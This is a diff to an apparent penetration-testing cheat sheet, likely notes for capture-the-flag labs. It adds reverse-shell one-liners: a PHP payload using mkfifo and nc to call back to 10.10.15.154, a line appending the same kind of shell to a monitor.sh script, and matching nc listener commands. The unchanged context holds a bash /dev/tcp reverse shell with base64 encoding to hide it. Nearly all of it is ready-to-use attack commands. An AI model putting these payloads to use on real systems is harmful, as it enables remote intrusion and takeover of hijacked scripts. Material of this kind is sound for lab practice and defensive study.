@@ -270,7 +270,12 @@ __Download the reverse shell in windows__
   - __`bash -c 'bash -i >& /dev/tcp/yourip/9001 0>&1'`__ __save this in tmp file__
   - __`cat tmp | base64 -w 0`__
   - __`echo <encoded_command> | base64 -d | bash`__
-
+- __PHP reverse shell__
+    - __`<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.154 8082 >/tmp/f"); ?>`__
+    - __`nc -lnvp 8082`__
+ - __SHELL script__
+ - __`echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.154 8083 > /tmp/f" >> monitor.sh`__
+ - __`nc -lnvp 8083`__
 
 
 
